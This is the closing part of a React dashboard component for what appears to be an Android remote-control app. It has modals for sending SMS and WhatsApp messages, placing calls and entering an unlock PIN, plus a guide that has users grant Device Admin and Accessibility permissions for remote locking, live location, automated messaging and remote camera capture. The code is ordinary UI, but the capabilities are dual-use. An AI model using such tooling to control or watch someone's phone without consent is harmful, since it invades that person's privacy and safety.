                              fontSize: "13px", fontWeight: 600,
                              cursor: isLoading ? "not-allowed" : "pointer",
                              fontFamily: "General Sans, sans-serif",
                              transition: "all 0.25s ease",
                              display: "flex", alignItems: "center",
                              justifyContent: "center", gap: "8px",
                              opacity: isLoading ? 0.9 : 1,
                            }}
                            onMouseEnter={(e) => {
                              if (!isLoading) {
                                e.currentTarget.style.transform = "scale(1.03)"
                                e.currentTarget.style.boxShadow = `0 4px 20px ${btn.bd}`
                              }
                            }}
                            onMouseLeave={(e) => {
                              if (!isLoading) {
                                e.currentTarget.style.transform = "scale(1)"
                                e.currentTarget.style.boxShadow = "none"
                              }
                            }}
                          >
                            {isLoading && (
                              <div style={{
                                width: "14px", height: "14px",
                                border: `2px solid rgba(255,255,255,0.2)`,
                                borderTopColor: btn.loadColor,
                                borderRadius: "50%",
                                animation: "spin 0.8s linear infinite",
                                flexShrink: 0,
                              }} />
                            )}
                            {isLoading ? "Sending..." : btn.label}
                          </button>
                        )
                      })}
                    </div>
                  </div>
                )
              })}
            </div>
          )}

          {/* Instructions Guide */}
          <div style={{ marginBottom: "32px", borderRadius: "16px", background: "rgba(255,255,255,0.02)", border: "1px solid rgba(255,255,255,0.06)", padding: "24px", backdropFilter: "blur(12px)", animation: "fadeIn 0.4s ease both" }}>
            <h2 style={{ margin: "0 0 16px 0", fontSize: "18px", fontWeight: 600, color: "#ffffff", display: "flex", alignItems: "center", gap: "8px" }}>
              <span>📖</span> App Setup & Required Permissions
            </h2>
            <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(260px, 1fr))", gap: "16px" }}>
              <div style={{ padding: "16px", background: "rgba(0,0,0,0.2)", borderRadius: "12px", border: "1px solid rgba(59,130,246,0.15)" }}>
                <h3 style={{ margin: "0 0 8px 0", fontSize: "14px", color: "#60a5fa", display: "flex", alignItems: "center", gap: "6px" }}><span>📍</span> Location</h3>
                <p style={{ margin: 0, fontSize: "13px", color: "rgba(255,255,255,0.6)", lineHeight: 1.5 }}>
                  Must enable <strong>Location feature (GPS)</strong> in Android settings and grant location permission to view real-time maps.
                </p>
              </div>
              
              <div style={{ padding: "16px", background: "rgba(0,0,0,0.2)", borderRadius: "12px", border: "1px solid rgba(239,68,68,0.15)" }}>
                <h3 style={{ margin: "0 0 8px 0", fontSize: "14px", color: "#ef4444", display: "flex", alignItems: "center", gap: "6px" }}><span>🔒</span> Lock & Unlock</h3>
                <p style={{ margin: 0, fontSize: "13px", color: "rgba(255,255,255,0.6)", lineHeight: 1.5 }}>
                  Enable <strong>Device Admin</strong> inside the Android app after login, AND grant <strong>Accessibility permission</strong> in device settings.
                </p>
              </div>

              <div style={{ padding: "16px", background: "rgba(0,0,0,0.2)", borderRadius: "12px", border: "1px solid rgba(16,185,129,0.15)" }}>
                <h3 style={{ margin: "0 0 8px 0", fontSize: "14px", color: "#10b981", display: "flex", alignItems: "center", gap: "6px" }}><span>💬</span> WhatsApp & SMS</h3>
                <p style={{ margin: 0, fontSize: "13px", color: "rgba(255,255,255,0.6)", lineHeight: 1.5 }}>
                  Grant <strong>Accessibility permission</strong> in Android settings to allow the app to send messages automatically.
                </p>
              </div>

              <div style={{ padding: "16px", background: "rgba(0,0,0,0.2)", borderRadius: "12px", border: "1px solid rgba(236,72,153,0.15)" }}>
                <h3 style={{ margin: "0 0 8px 0", fontSize: "14px", color: "#f472b6", display: "flex", alignItems: "center", gap: "6px" }}><span>📸</span> Camera</h3>
                <p style={{ margin: 0, fontSize: "13px", color: "rgba(255,255,255,0.6)", lineHeight: 1.5 }}>
                  Grant <strong>Camera permissions</strong>. A system notification will appear on the device whenever a picture is captured remotely.
                </p>
              </div>
            </div>
          </div>

          {/* Command Logs */}
          <div>
            <h2 style={{ margin: "0 0 14px 0", fontSize: "18px", fontWeight: 600 }}>📋 Activity Log</h2>

            {commandLogs.length > 0 ? (
              <div style={{ borderRadius: "14px", background: "rgba(255,255,255,0.02)", border: "1px solid rgba(255,255,255,0.06)", backdropFilter: "blur(12px)", overflow: "hidden" }}>
                {commandLogs.map((log, i) => (
                  <div
                    key={log.id}
                    style={{
                      padding: "14px 20px",
                      borderBottom: i < commandLogs.length - 1 ? "1px solid rgba(255,255,255,0.04)" : "none",
                      display: "flex", alignItems: "center",
                      justifyContent: "space-between", gap: "12px",
                      animation: `fadeIn 0.2s ease ${i * 0.03}s both`,
                    }}
                  >
                    <div>
                      <p style={{ margin: 0, fontSize: "13px", fontWeight: 500 }}>{log.type}</p>
                      <p style={{ margin: "2px 0 0 0", fontSize: "11px", color: "rgba(255,255,255,0.4)" }}>
                        {log.deviceName} · {log.createdAt ? new Date(log.createdAt.seconds * 1000).toLocaleString() : "Just now"}
                      </p>
                    </div>
                    <span style={{
                      padding: "3px 8px", borderRadius: "6px", fontSize: "11px", fontWeight: 500,
                      color: log.status === "failed" ? "#ef4444" : "#10b981",
                      background: log.status === "failed" ? "rgba(239,68,68,0.1)" : "rgba(16,185,129,0.1)",
                      flexShrink: 0,
                    }}>
                      {log.status}
                    </span>
                  </div>
                ))}
              </div>
            ) : (
              <div style={{ borderRadius: "14px", background: "rgba(255,255,255,0.02)", border: "1px solid rgba(255,255,255,0.06)", padding: "40px 24px", textAlign: "center" }}>
                <p style={{ margin: 0, fontSize: "13px", color: "rgba(255,255,255,0.4)" }}>
                  No commands sent yet. Select a device and try a control.
                </p>
              </div>
            )}
          </div>
        </main>
      </div>

      {/* SMS Modal */}
      {showSmsModal && (
        <div style={{ position: "fixed", top: 0, left: 0, width: "100%", height: "100%", background: "rgba(0,0,0,0.7)", zIndex: 100, display: "flex", alignItems: "center", justifyContent: "center", padding: "20px", boxSizing: "border-box" }} onClick={() => setShowSmsModal(false)}>
          <div style={{ width: "100%", maxWidth: "360px", background: "rgba(20,20,20,0.95)", backdropFilter: "blur(20px)", borderRadius: "16px", border: "1px solid rgba(255,255,255,0.1)", padding: "28px 24px", boxSizing: "border-box", animation: "fadeIn 0.2s ease" }} onClick={(e) => e.stopPropagation()}>
            <h3 style={{ margin: "0 0 20px 0", fontSize: "18px", fontWeight: 600 }}>💬 Send SMS</h3>
            <div style={{ marginBottom: "14px" }}>
              <label style={{ display: "block", fontSize: "13px", fontWeight: 500, color: "rgba(255,255,255,0.5)", marginBottom: "6px" }}>Phone Number</label>
              <input type="tel" value={smsNumber} onChange={(e) => setSmsNumber(e.target.value)} placeholder="+1234567890" style={{ width: "100%", height: "42px", padding: "0 14px", borderRadius: "10px", background: "rgba(255,255,255,0.06)", border: "1px solid rgba(255,255,255,0.1)", color: "#ffffff", fontSize: "14px", outline: "none", boxSizing: "border-box", fontFamily: "General Sans, sans-serif" }} />
            </div>
            <div style={{ marginBottom: "20px" }}>
              <label style={{ display: "block", fontSize: "13px", fontWeight: 500, color: "rgba(255,255,255,0.5)", marginBottom: "6px" }}>Message</label>
              <textarea value={smsMessage} onChange={(e) => setSmsMessage(e.target.value)} placeholder="Type your message..." rows={3} style={{ width: "100%", padding: "12px 14px", borderRadius: "10px", background: "rgba(255,255,255,0.06)", border: "1px solid rgba(255,255,255,0.1)", color: "#ffffff", fontSize: "14px", outline: "none", boxSizing: "border-box", fontFamily: "General Sans, sans-serif", resize: "none" }} />
            </div>
            <div style={{ display: "flex", gap: "10px", justifyContent: "flex-end" }}>
              <button onClick={() => setShowSmsModal(false)} style={{ height: "38px", padding: "0 16px", borderRadius: "8px", border: "1px solid rgba(255,255,255,0.1)", background: "transparent", color: "rgba(255,255,255,0.7)", fontSize: "13px", fontWeight: 500, cursor: "pointer", fontFamily: "General Sans, sans-serif" }}>Cancel</button>
              <button onClick={handleSendSms} style={{ height: "38px", padding: "0 16px", borderRadius: "8px", border: "none", background: "#ffffff", color: "#000000", fontSize: "13px", fontWeight: 600, cursor: "pointer", fontFamily: "General Sans, sans-serif" }}>Send SMS</button>
            </div>
          </div>
        </div>
      )}

      {/* WhatsApp Modal */}
      {showWhatsAppModal && (
        <div style={{ position: "fixed", top: 0, left: 0, width: "100%", height: "100%", background: "rgba(0,0,0,0.7)", zIndex: 100, display: "flex", alignItems: "center", justifyContent: "center", padding: "20px", boxSizing: "border-box" }} onClick={() => setShowWhatsAppModal(false)}>
          <div style={{ width: "100%", maxWidth: "360px", background: "rgba(20,20,20,0.95)", backdropFilter: "blur(20px)", borderRadius: "16px", border: "1px solid rgba(37,211,102,0.2)", padding: "28px 24px", boxSizing: "border-box", animation: "fadeIn 0.2s ease" }} onClick={(e) => e.stopPropagation()}>
            <h3 style={{ margin: "0 0 20px 0", fontSize: "18px", fontWeight: 600, color: "#25d366" }}>📱 Send WhatsApp Message</h3>
            <div style={{ marginBottom: "14px" }}>
              <label style={{ display: "block", fontSize: "13px", fontWeight: 500, color: "rgba(255,255,255,0.5)", marginBottom: "6px" }}>Phone Number (with country code)</label>
              <input type="tel" value={waNumber} onChange={(e) => setWaNumber(e.target.value)} placeholder="+919876543210" style={{ width: "100%", height: "42px", padding: "0 14px", borderRadius: "10px", background: "rgba(255,255,255,0.06)", border: "1px solid rgba(255,255,255,0.1)", color: "#ffffff", fontSize: "14px", outline: "none", boxSizing: "border-box", fontFamily: "General Sans, sans-serif" }} />
            </div>
            <div style={{ marginBottom: "20px" }}>
              <label style={{ display: "block", fontSize: "13px", fontWeight: 500, color: "rgba(255,255,255,0.5)", marginBottom: "6px" }}>Message</label>
              <textarea value={waMessage} onChange={(e) => setWaMessage(e.target.value)} placeholder="Type your WhatsApp message..." rows={3} style={{ width: "100%", padding: "12px 14px", borderRadius: "10px", background: "rgba(255,255,255,0.06)", border: "1px solid rgba(255,255,255,0.1)", color: "#ffffff", fontSize: "14px", outline: "none", boxSizing: "border-box", fontFamily: "General Sans, sans-serif", resize: "none" }} />
            </div>
            <div style={{ display: "flex", gap: "10px", justifyContent: "flex-end" }}>
              <button onClick={() => setShowWhatsAppModal(false)} style={{ height: "38px", padding: "0 16px", borderRadius: "8px", border: "1px solid rgba(255,255,255,0.1)", background: "transparent", color: "rgba(255,255,255,0.7)", fontSize: "13px", fontWeight: 500, cursor: "pointer", fontFamily: "General Sans, sans-serif" }}>Cancel</button>
              <button onClick={handleSendWhatsApp} style={{ height: "38px", padding: "0 16px", borderRadius: "8px", border: "none", background: "#25d366", color: "#ffffff", fontSize: "13px", fontWeight: 600, cursor: "pointer", fontFamily: "General Sans, sans-serif" }}>Send via WhatsApp</button>
            </div>
          </div>
        </div>
      )}

      {/* Call Modal */}
      {showCallModal && (
        <div style={{ position: "fixed", top: 0, left: 0, width: "100%", height: "100%", background: "rgba(0,0,0,0.7)", zIndex: 100, display: "flex", alignItems: "center", justifyContent: "center", padding: "20px", boxSizing: "border-box" }} onClick={() => setShowCallModal(false)}>
          <div style={{ width: "100%", maxWidth: "360px", background: "rgba(20,20,20,0.95)", backdropFilter: "blur(20px)", borderRadius: "16px", border: "1px solid rgba(59,130,246,0.2)", padding: "28px 24px", boxSizing: "border-box", animation: "fadeIn 0.2s ease" }} onClick={(e) => e.stopPropagation()}>
            <h3 style={{ margin: "0 0 20px 0", fontSize: "18px", fontWeight: 600, color: "#3b82f6" }}>📞 Make a Call</h3>
            <div style={{ marginBottom: "20px" }}>
              <label style={{ display: "block", fontSize: "13px", fontWeight: 500, color: "rgba(255,255,255,0.5)", marginBottom: "6px" }}>Phone Number</label>
              <input type="tel" value={callNumber} onChange={(e) => setCallNumber(e.target.value)} placeholder="+1234567890" style={{ width: "100%", height: "42px", padding: "0 14px", borderRadius: "10px", background: "rgba(255,255,255,0.06)", border: "1px solid rgba(255,255,255,0.1)", color: "#ffffff", fontSize: "14px", outline: "none", boxSizing: "border-box", fontFamily: "General Sans, sans-serif" }} />
            </div>
            <div style={{ display: "flex", gap: "10px", justifyContent: "flex-end" }}>
              <button onClick={() => setShowCallModal(false)} style={{ height: "38px", padding: "0 16px", borderRadius: "8px", border: "1px solid rgba(255,255,255,0.1)", background: "transparent", color: "rgba(255,255,255,0.7)", fontSize: "13px", fontWeight: 500, cursor: "pointer", fontFamily: "General Sans, sans-serif" }}>Cancel</button>
              <button onClick={handleMakeCall} style={{ height: "38px", padding: "0 16px", borderRadius: "8px", border: "none", background: "#3b82f6", color: "#ffffff", fontSize: "13px", fontWeight: 600, cursor: "pointer", fontFamily: "General Sans, sans-serif" }}>Call Now</button>
            </div>
          </div>
        </div>
      )}

      {/* Unlock Modal */}
      {showUnlockModal && (
        <div style={{ position: "fixed", top: 0, left: 0, width: "100%", height: "100%", background: "rgba(0,0,0,0.7)", zIndex: 100, display: "flex", alignItems: "center", justifyContent: "center", padding: "20px", boxSizing: "border-box" }} onClick={() => setShowUnlockModal(false)}>
          <div style={{ width: "100%", maxWidth: "360px", background: "rgba(20,20,20,0.95)", backdropFilter: "blur(20px)", borderRadius: "16px", border: "1px solid rgba(34,197,94,0.2)", padding: "28px 24px", boxSizing: "border-box", animation: "fadeIn 0.2s ease" }} onClick={(e) => e.stopPropagation()}>
            <h3 style={{ margin: "0 0 20px 0", fontSize: "18px", fontWeight: 600, color: "#22c55e" }}>🔓 Unlock Device</h3>
            <div style={{ marginBottom: "20px" }}>
              <label style={{ display: "block", fontSize: "13px", fontWeight: 500, color: "rgba(255,255,255,0.5)", marginBottom: "6px" }}>Enter PIN</label>
              <input type="password" value={unlockPin} onChange={(e) => setUnlockPin(e.target.value)} placeholder="Enter device PIN" style={{ width: "100%", height: "42px", padding: "0 14px", borderRadius: "10px", background: "rgba(255,255,255,0.06)", border: "1px solid rgba(255,255,255,0.1)", color: "#ffffff", fontSize: "14px", outline: "none", boxSizing: "border-box", fontFamily: "General Sans, sans-serif" }} />
            </div>
            <div style={{ display: "flex", gap: "10px", justifyContent: "flex-end" }}>
              <button onClick={() => setShowUnlockModal(false)} style={{ height: "38px", padding: "0 16px", borderRadius: "8px", border: "1px solid rgba(255,255,255,0.1)", background: "transparent", color: "rgba(255,255,255,0.7)", fontSize: "13px", fontWeight: 500, cursor: "pointer", fontFamily: "General Sans, sans-serif" }}>Cancel</button>
              <button onClick={handleUnlockDevice} style={{ height: "38px", padding: "0 16px", borderRadius: "8px", border: "none", background: "#22c55e", color: "#ffffff", fontSize: "13px", fontWeight: 600, cursor: "pointer", fontFamily: "General Sans, sans-serif" }}>Unlock</button>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}

export default Dashboard